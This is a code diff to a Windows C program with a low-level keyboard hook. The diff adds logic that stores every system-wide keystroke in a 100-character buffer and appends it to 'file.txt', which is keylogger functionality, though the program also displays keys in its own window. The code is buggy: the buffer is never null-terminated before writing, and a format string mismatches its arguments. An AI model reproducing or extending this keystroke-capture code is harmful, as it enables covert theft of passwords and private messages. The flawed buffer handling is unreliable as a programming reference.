@@ -17,11 +17,12 @@ WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
 WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
 WCHAR str[MAX_LOADSTRING];
 HWND list;                                      // Console
+FILE* f;
 HHOOK kbhook;                                   // Hook handle for KB
 HHOOK LOWkbhook;                                   // Hook handle for KB
                                                // Hook handle for KB
 
-
+int buffCount = 0;
 
 // Forward declarations of functions included in this code module:
 ATOM                MyRegisterClass(HINSTANCE hInstance);
@@ -36,6 +37,8 @@ LRESULT CALLBACK      KbHookProc(int, WPARAM, LPARAM);
 DWORD CALLBACK      LOWStartKbHook(LPVOID);
 DWORD CALLBACK      LOWStopKbHook(LPVOID);
 LRESULT CALLBACK    LOWKbHookProc(int, WPARAM, LPARAM);
+
+void SaveToFile(char*);
 
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance,
@@ -311,6 +314,19 @@ DWORD CALLBACK  LOWStopKbHook(LPVOID params) {
 
 }
 
+void SaveToFile(char* buff) {
+
+
+    f = fopen("file.txt", "at");
+    fputs(buff, f);
+    fclose(f);
+
+
+}
+
+char text[100];
+
+
 LRESULT CALLBACK LOWKbHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
     if (nCode == HC_ACTION) {
@@ -318,9 +334,19 @@ LRESULT CALLBACK LOWKbHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
             KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lParam);
         
 
-        _snwprintf(str, MAX_LOADSTRING, L"%d (%d)", keyInfo.vkCode, keyInfo.scanCode);
+        _snwprintf(str, MAX_LOADSTRING, L"%c %d (%d)", keyInfo.vkCode, keyInfo.scanCode, buffCount);
 
         SendMessageW(list, LB_ADDSTRING, 0, (LPARAM)str);
+
+        text[buffCount] = (char)keyInfo.vkCode;
+        buffCount++;
+
+
+        if (buffCount >= 100) {
+            SaveToFile(text);
+            strcpy(text, "");
+            buffCount = 0;
+        }
       }
     }
     return CallNextHookEx(LOWkbhook, nCode, wParam, lParam);
